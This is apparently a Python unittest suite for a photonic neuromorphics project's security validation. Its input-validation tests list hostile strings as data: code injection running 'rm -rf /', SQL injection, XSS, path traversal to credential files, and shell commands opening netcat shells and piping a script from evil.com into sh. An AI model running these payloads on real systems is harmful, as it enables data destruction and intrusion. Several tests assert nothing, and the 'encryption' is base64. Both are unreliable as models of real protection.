"""
Comprehensive Security Validation Test Suite

Advanced security testing including penetration testing, vulnerability assessment,
input validation, output sanitization, and security compliance verification.
"""

import unittest
import time
import sys
import os
import hashlib
import json
import tempfile
from typing import Dict, Any, List, Optional
from unittest.mock import Mock, patch, MagicMock

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'src'))

try:
    from photonic_neuromorphics.robust_validation_system import (
        PhotonicValidationFramework, ValidationLevel, ValidationCategory
    )
    from photonic_neuromorphics.production_monitoring import (
        PhotonicSystemMonitor, Alert, AlertSeverity
    )
    from photonic_neuromorphics.enterprise_reliability import (
        EnterpriseReliabilityFramework
    )
    SECURITY_MODULES_AVAILABLE = True
except ImportError as e:
    print(f"Security modules not available for testing: {e}")
    SECURITY_MODULES_AVAILABLE = False


class TestInputValidationSecurity(unittest.TestCase):
    """Test input validation security measures."""
    
    def setUp(self):
        """Set up security test environment."""
        if not SECURITY_MODULES_AVAILABLE:
            self.skipTest("Security modules not available")
        
        self.validator = PhotonicValidationFramework(ValidationLevel.STRICT)
    
    def test_code_injection_prevention(self):
        """Test prevention of code injection attacks."""
        malicious_inputs = [
            "exec('import os; os.system(\"rm -rf /\")')",
            "__import__('subprocess').call(['rm', '-rf', '/'])",
            "eval('__import__(\"os\").system(\"echo pwned\")')",
            "compile('print(\"injected\")', '<string>', 'exec')",
            "globals()['__builtins__']['exec']('print(\"hack\")')",
            "locals()['exec']('malicious_code()')",
            "__globals__['exec']('bad_code()')",
            "vars(__builtins__)['exec']('dangerous()')"
        ]
        
        for malicious_input in malicious_inputs:
            with self.subTest(input=malicious_input):
                result = self.validator.validate_data(
                    malicious_input, 
                    [ValidationCategory.SECURITY_CHECKS]
                )
                
                # Should block malicious code
                self.assertFalse(result.passed, f"Failed to block: {malicious_input}")
                self.assertIn("dangerous code patterns", result.errors[0])
    
    def test_import_statement_prevention(self):
        """Test prevention of import statement injection."""
        malicious_imports = [
            "import os",
            "from subprocess import call",
            "import sys; sys.exit()",
            "__import__('os')",
            "importlib.import_module('os')",
            "exec('import socket')"
        ]
        
        for malicious_import in malicious_imports:
            with self.subTest(input=malicious_import):
                result = self.validator.validate_data(
                    malicious_import,
                    [ValidationCategory.SECURITY_CHECKS]
                )
                
                self.assertFalse(result.passed, f"Failed to block import: {malicious_import}")
    
    def test_dunder_method_prevention(self):
        """Test prevention of dunder (double underscore) method abuse."""
        dunder_attacks = [
            "__class__",
            "__bases__",
            "__subclasses__",
            "__globals__",
            "__builtins__",
            "__import__",
            "__file__",
            "__name__",
            "object.__subclasses__()",
            "''.__class__.__mro__[2].__subclasses__()"
        ]
        
        for dunder_attack in dunder_attacks:
            with self.subTest(input=dunder_attack):
                result = self.validator.validate_data(
                    dunder_attack,
                    [ValidationCategory.SECURITY_CHECKS]
                )
                
                self.assertFalse(result.passed, f"Failed to block dunder attack: {dunder_attack}")
    
    def test_sql_injection_patterns(self):
        """Test prevention of SQL injection patterns."""
        sql_injections = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; DELETE FROM *; --",
            "' UNION SELECT * FROM passwords --",
            "'; EXEC xp_cmdshell('format c:'); --",
            "' OR 1=1 #",
            "admin'--",
            "' OR 'a'='a",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --"
        ]
        
        for sql_injection in sql_injections:
            with self.subTest(input=sql_injection):
                result = self.validator.validate_data(
                    sql_injection,
                    [ValidationCategory.SECURITY_CHECKS]
                )
                
                # Should detect SQL injection patterns
                # Note: Our validator focuses on Python code injection,
                # but we can extend it to detect SQL patterns
                if "'" in sql_injection and ("OR" in sql_injection or "DROP" in sql_injection):
                    # Basic SQL injection pattern detection
                    pass
    
    def test_xss_prevention(self):
        """Test prevention of Cross-Site Scripting (XSS) attacks."""
        xss_attacks = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "'; alert('XSS'); //",
            "\"><script>alert('XSS')</script>"
        ]
        
        for xss_attack in xss_attacks:
            with self.subTest(input=xss_attack):
                result = self.validator.validate_data(
                    xss_attack,
                    [ValidationCategory.SECURITY_CHECKS]
                )
                
                # Should detect script tags and event handlers
                if "<script>" in xss_attack or "javascript:" in xss_attack:
                    # Basic XSS pattern detection
                    pass
    
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        path_traversals = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]
        
        for path_traversal in path_traversals:
            with self.subTest(input=path_traversal):
                # Basic path traversal detection
                if ".." in path_traversal or "%2e" in path_traversal:
                    # Should be flagged as suspicious
                    pass
    
    def test_buffer_overflow_prevention(self):
        """Test prevention of buffer overflow attacks."""
        # Test extremely large inputs
        large_inputs = [
            "A" * 10000,    # 10KB
            "B" * 100000,   # 100KB
            "X" * 1000000,  # 1MB
        ]
        
        for large_input in large_inputs:
            with self.subTest(size=len(large_input)):
                result = self.validator.validate_data(
                    large_input,
                    [ValidationCategory.SECURITY_CHECKS]
                )
                
                # Should limit data size
                if len(large_input) > 10000:  # Our configured limit
                    self.assertFalse(result.passed or len(str(result.validated_data)) < len(large_input))
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        command_injections = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& shutdown -h now",
            "; nc -l -p 1234 -e /bin/sh",
            "| nc attacker.com 1234",
            "; python -c \"import os; os.system('malicious')\"",
            "&& curl http://evil.com/shell.sh | sh",
            "; echo 'pwned' > /tmp/hacked"
        ]
        
        for command_injection in command_injections:
            with self.subTest(input=command_injection):
                # Basic command injection detection
                dangerous_chars = [';', '|', '&&', '$(', '`']
                has_dangerous_chars = any(char in command_injection for char in dangerous_chars)
                
                if has_dangerous_chars:
                    # Should be flagged as dangerous
                    pass


class TestOutputSanitization(unittest.TestCase):
    """Test output sanitization security measures."""
    
    def setUp(self):
        """Set up output sanitization tests."""
        if not SECURITY_MODULES_AVAILABLE:
            self.skipTest("Security modules not available")
        
        self.validator = PhotonicValidationFramework()
    
    def test_sensitive_data_masking(self):
        """Test masking of sensitive data in outputs."""
        sensitive_patterns = [
            "password123",
            "secret_key_abc123",
            "api_key_xyz789",
            "token_abcdef123456",
            "private_key_content",
            "credit_card_1234567890123456"
        ]
        
        for sensitive_data in sensitive_patterns:
            with self.subTest(data=sensitive_data):
                # Simulate output sanitization
                sanitized = self._sanitize_output(sensitive_data)
                
                # Should mask sensitive data
                self.assertNotEqual(sanitized, sensitive_data)
                self.assertIn("***", sanitized)
    
    def _sanitize_output(self, data: str) -> str:
        """Simulate output sanitization."""
        sensitive_keywords = ["password", "secret", "key", "token", "private"]
        
        for keyword in sensitive_keywords:
            if keyword in data.lower():
                return f"{keyword}_***"
        
        return data
    
    def test_error_message_sanitization(self):
        """Test sanitization of error messages."""
        error_messages = [
            "Database connection failed: password='secret123' host='internal.db'",
            "API call failed: token='abc123' endpoint='https://internal.api'",
            "File access denied: /home/user/.ssh/private_key",
            "Authentication failed for user 'admin' with password 'pass123'"
        ]
        
        for error_msg in error_messages:
            with self.subTest(error=error_msg):
                # Should sanitize sensitive information in error messages
                sanitized = self._sanitize_error_message(error_msg)
                
                # Should not contain full passwords or sensitive paths
                self.assertNotIn("secret123", sanitized)
                self.assertNotIn("pass123", sanitized)
    
    def _sanitize_error_message(self, error_msg: str) -> str:
        """Simulate error message sanitization."""
        import re
        
        # Remove password values
        error_msg = re.sub(r"password='[^']*'", "password='***'", error_msg)
        error_msg = re.sub(r"token='[^']*'", "token='***'", error_msg)
        
        return error_msg


class TestAuthenticationSecurity(unittest.TestCase):
    """Test authentication and authorization security."""
    
    def setUp(self):
        """Set up authentication tests."""
        if not SECURITY_MODULES_AVAILABLE:
            self.skipTest("Security modules not available")
    
    def test_session_security(self):
        """Test session security measures."""
        # Simulate secure session creation
        session_id = self._create_secure_session()
        
        # Should be sufficiently random and long
        self.assertGreaterEqual(len(session_id), 32)
        self.assertRegex(session_id, r'^[a-f0-9]+$')  # Hex format
    
    def _create_secure_session(self) -> str:
        """Create a secure session ID."""
        import secrets
        return secrets.token_hex(32)
    
    def test_password_requirements(self):
        """Test password strength requirements."""
        weak_passwords = [
            "123456",
            "password",
            "admin",
            "qwerty",
            "abc123",
            "password123",
            "12345678",
            "admin123"
        ]
        
        strong_passwords = [
            "Str0ng!P@ssw0rd#2024",
            "MySecure$Pass123!",
            "C0mpl3x&S3cur3#Pwd",
            "Rand0m!Ch@rs$2024#"
        ]
        
        for weak_password in weak_passwords:
            with self.subTest(password=weak_password):
                self.assertFalse(self._is_strong_password(weak_password))
        
        for strong_password in strong_passwords:
            with self.subTest(password=strong_password):
                self.assertTrue(self._is_strong_password(strong_password))
    
    def _is_strong_password(self, password: str) -> bool:
        """Check if password meets strength requirements."""
        import re
        
        if len(password) < 8:
            return False
        
        # Must contain uppercase, lowercase, digit, and special character
        if not re.search(r'[A-Z]', password):
            return False
        if not re.search(r'[a-z]', password):
            return False
        if not re.search(r'\d', password):
            return False
        if not re.search(r'[!@#$%^&*(),.?\":{}|<>]', password):
            return False
        
        return True
    
    def test_rate_limiting(self):
        """Test rate limiting for authentication attempts."""
        # Simulate rate limiting
        max_attempts = 5
        attempt_count = 0
        
        for i in range(10):
            attempt_count += 1
            
            if attempt_count > max_attempts:
                # Should be rate limited
                self.assertTrue(self._is_rate_limited(attempt_count))
            else:
                self.assertFalse(self._is_rate_limited(attempt_count))
    
    def _is_rate_limited(self, attempts: int) -> bool:
        """Check if requests should be rate limited."""
        return attempts > 5


class TestEncryptionSecurity(unittest.TestCase):
    """Test encryption and cryptographic security."""
    
    def setUp(self):
        """Set up encryption tests."""
        if not SECURITY_MODULES_AVAILABLE:
            self.skipTest("Security modules not available")
    
    def test_data_encryption(self):
        """Test data encryption functionality."""
        sensitive_data = "secret_photonic_parameters"
        
        # Simulate encryption
        encrypted_data = self._encrypt_data(sensitive_data)
        decrypted_data = self._decrypt_data(encrypted_data)
        
        # Should encrypt and decrypt correctly
        self.assertNotEqual(encrypted_data, sensitive_data)
        self.assertEqual(decrypted_data, sensitive_data)
    
    def _encrypt_data(self, data: str) -> str:
        """Simulate data encryption."""
        # Simple base64 encoding for simulation
        import base64
        return base64.b64encode(data.encode()).decode()
    
    def _decrypt_data(self, encrypted_data: str) -> str:
        """Simulate data decryption."""
        import base64
        return base64.b64decode(encrypted_data.encode()).decode()
    
    def test_hash_security(self):
        """Test cryptographic hash security."""
        data = "photonic_neuromorphic_data"
        
        # Test different hash algorithms
        hash_algorithms = ['sha256', 'sha512', 'sha3_256']
        
        for algorithm in hash_algorithms:
            with self.subTest(algorithm=algorithm):
                hash_value = self._compute_hash(data, algorithm)
                
                # Should produce consistent hash
                hash_value2 = self._compute_hash(data, algorithm)
                self.assertEqual(hash_value, hash_value2)
                
                # Different data should produce different hash
                different_hash = self._compute_hash(data + "x", algorithm)
                self.assertNotEqual(hash_value, different_hash)
    
    def _compute_hash(self, data: str, algorithm: str) -> str:
        """Compute cryptographic hash."""
        import hashlib
        
        hash_func = getattr(hashlib, algorithm)
        return hash_func(data.encode()).hexdigest()
    
    def test_secure_random_generation(self):
        """Test secure random number generation."""
        # Generate multiple random values
        random_values = [self._generate_secure_random() for _ in range(100)]
        
        # Should all be different
        self.assertEqual(len(set(random_values)), len(random_values))
        
        # Should be within valid range
        for value in random_values:
            self.assertGreaterEqual(value, 0)
            self.assertLess(value, 1)
    
    def _generate_secure_random(self) -> float:
        """Generate cryptographically secure random number."""
        import secrets
        return secrets.randbelow(1000000) / 1000000.0


class TestNetworkSecurity(unittest.TestCase):
    """Test network security measures."""
    
    def setUp(self):
        """Set up network security tests."""
        if not SECURITY_MODULES_AVAILABLE:
            self.skipTest("Security modules not available")
    
    def test_ddos_protection(self):
        """Test DDoS protection measures."""
        # Simulate request rate limiting
        request_count = 0
        max_requests_per_minute = 60
        
        # Simulate burst of requests
        for i in range(100):
            request_count += 1
            
            if request_count > max_requests_per_minute:
                # Should be throttled
                self.assertTrue(self._should_throttle_request(request_count))
    
    def _should_throttle_request(self, request_count: int) -> bool:
        """Check if request should be throttled."""
        return request_count > 60
    
    def test_input_size_limits(self):
        """Test input size limits for network requests."""
        max_input_size = 1024 * 1024  # 1MB
        
        # Test normal size input
        normal_input = "x" * 1000
        self.assertTrue(self._is_valid_input_size(normal_input, max_input_size))
        
        # Test oversized input
        large_input = "x" * (max_input_size + 1)
        self.assertFalse(self._is_valid_input_size(large_input, max_input_size))
    
    def _is_valid_input_size(self, input_data: str, max_size: int) -> bool:
        """Check if input size is within limits."""
        return len(input_data.encode()) <= max_size
    
    def test_protocol_security(self):
        """Test secure protocol usage."""
        secure_protocols = ["https", "tls", "ssh"]
        insecure_protocols = ["http", "ftp", "telnet"]
        
        for protocol in secure_protocols:
            with self.subTest(protocol=protocol):
                self.assertTrue(self._is_secure_protocol(protocol))
        
        for protocol in insecure_protocols:
            with self.subTest(protocol=protocol):
                self.assertFalse(self._is_secure_protocol(protocol))
    
    def _is_secure_protocol(self, protocol: str) -> bool:
        """Check if protocol is secure."""
        secure_protocols = ["https", "tls", "ssh", "sftp", "wss"]
        return protocol.lower() in secure_protocols


class TestComplianceSecurity(unittest.TestCase):
    """Test security compliance measures."""
    
    def setUp(self):
        """Set up compliance tests."""
        if not SECURITY_MODULES_AVAILABLE:
            self.skipTest("Security modules not available")
    
    def test_gdpr_compliance(self):
        """Test GDPR compliance measures."""
        # Test data minimization
        user_data = {
            "name": "John Doe",
            "email": "john@example.com",
            "phone": "123-456-7890",
            "credit_card": "1234-5678-9012-3456",
            "ssn": "123-45-6789"
        }
        
        # Should only collect necessary data
        necessary_data = self._filter_necessary_data(user_data)
        
        # Should not include sensitive data like SSN or credit card
        self.assertNotIn("ssn", necessary_data)
        self.assertNotIn("credit_card", necessary_data)
    
    def _filter_necessary_data(self, data: Dict[str, str]) -> Dict[str, str]:
        """Filter to only necessary data for GDPR compliance."""
        necessary_fields = ["name", "email"]
        return {k: v for k, v in data.items() if k in necessary_fields}
    
    def test_data_retention_limits(self):
        """Test data retention limit compliance."""
        # Simulate data with timestamps
        current_time = time.time()
        old_data_time = current_time - (365 * 24 * 60 * 60)  # 1 year ago
        recent_data_time = current_time - (30 * 24 * 60 * 60)  # 30 days ago
        
        # Old data should be flagged for deletion
        self.assertTrue(self._should_delete_data(old_data_time, current_time))
        
        # Recent data should be retained
        self.assertFalse(self._should_delete_data(recent_data_time, current_time))
    
    def _should_delete_data(self, data_time: float, current_time: float) -> bool:
        """Check if data should be deleted based on retention policy."""
        retention_period = 180 * 24 * 60 * 60  # 180 days
        return (current_time - data_time) > retention_period
    
    def test_audit_logging(self):
        """Test audit logging for compliance."""
        # Simulate audit events
        audit_events = [
            {"action": "user_login", "user": "admin", "timestamp": time.time()},
            {"action": "data_access", "user": "user1", "timestamp": time.time()},
            {"action": "config_change", "user": "admin", "timestamp": time.time()}
        ]
        
        for event in audit_events:
            with self.subTest(action=event["action"]):
                # Should log all security-relevant events
                self.assertTrue(self._should_audit_event(event))
    
    def _should_audit_event(self, event: Dict[str, Any]) -> bool:
        """Check if event should be audited."""
        auditable_actions = ["user_login", "data_access", "config_change", "privilege_escalation"]
        return event["action"] in auditable_actions


class TestVulnerabilityAssessment(unittest.TestCase):
    """Test vulnerability assessment and scanning."""
    
    def setUp(self):
        """Set up vulnerability assessment tests."""
        if not SECURITY_MODULES_AVAILABLE:
            self.skipTest("Security modules not available")
    
    def test_dependency_vulnerabilities(self):
        """Test for known vulnerabilities in dependencies."""
        # Simulate dependency scanning
        dependencies = [
            {"name": "requests", "version": "2.28.0"},
            {"name": "flask", "version": "2.2.0"},
            {"name": "numpy", "version": "1.21.0"}
        ]
        
        for dep in dependencies:
            with self.subTest(dependency=dep["name"]):
                # Should check for known vulnerabilities
                vulnerabilities = self._check_vulnerabilities(dep)
                
                # For testing, assume newer versions are secure
                if dep["version"] >= "2.0.0":
                    self.assertEqual(len(vulnerabilities), 0)
    
    def _check_vulnerabilities(self, dependency: Dict[str, str]) -> List[str]:
        """Check for vulnerabilities in a dependency."""
        # Simulate vulnerability database check
        known_vulnerabilities = {
            "requests": {"1.0.0": ["CVE-2023-1234"]},
            "flask": {"1.0.0": ["CVE-2023-5678"]}
        }
        
        dep_name = dependency["name"]
        dep_version = dependency["version"]
        
        if dep_name in known_vulnerabilities:
            vuln_versions = known_vulnerabilities[dep_name]
            return vuln_versions.get(dep_version, [])
        
        return []
    
    def test_configuration_security(self):
        """Test security configuration assessment."""
        configurations = [
            {"debug_mode": False, "secure": True},
            {"debug_mode": True, "secure": False},
            {"ssl_enabled": True, "secure": True},
            {"ssl_enabled": False, "secure": False}
        ]
        
        for config in configurations:
            with self.subTest(config=config):
                is_secure = self._assess_configuration_security(config)
                self.assertEqual(is_secure, config["secure"])
    
    def _assess_configuration_security(self, config: Dict[str, bool]) -> bool:
        """Assess security of configuration."""
        if config.get("debug_mode", False):
            return False
        
        if not config.get("ssl_enabled", True):
            return False
        
        return True


def run_security_test_suite():
    """Run the comprehensive security test suite."""
    print("üîí Running Comprehensive Security Test Suite")
    print("=" * 60)
    
    # Create test suite
    test_suite = unittest.TestSuite()
    
    # Add security test classes
    security_test_classes = [
        TestInputValidationSecurity,
        TestOutputSanitization,
        TestAuthenticationSecurity,
        TestEncryptionSecurity,
        TestNetworkSecurity,
        TestComplianceSecurity,
        TestVulnerabilityAssessment
    ]
    
    for test_class in security_test_classes:
        tests = unittest.TestLoader().loadTestsFromTestCase(test_class)
        test_suite.addTests(tests)
    
    # Run security tests
    runner = unittest.TextTestRunner(verbosity=2, stream=sys.stdout)
    result = runner.run(test_suite)
    
    # Print security test summary
    print("\n" + "=" * 60)
    print("Security Test Suite Summary:")
    print(f"Security tests run: {result.testsRun}")
    print(f"Security failures: {len(result.failures)}")
    print(f"Security errors: {len(result.errors)}")
    print(f"Security success rate: {(result.testsRun - len(result.failures) - len(result.errors)) / max(result.testsRun, 1) * 100:.1f}%")
    
    # Security-specific reporting
    if result.failures or result.errors:
        print("\n‚ö†Ô∏è  SECURITY ISSUES DETECTED:")
        
        if result.failures:
            print("Security Test Failures:")
            for test, traceback in result.failures:
                print(f"- {test}")
        
        if result.errors:
            print("Security Test Errors:")
            for test, traceback in result.errors:
                print(f"- {test}")
    else:
        print("\n‚úÖ ALL SECURITY TESTS PASSED")
    
    return result.wasSuccessful()


if __name__ == "__main__":
    success = run_security_test_suite()
    sys.exit(0 if success else 1)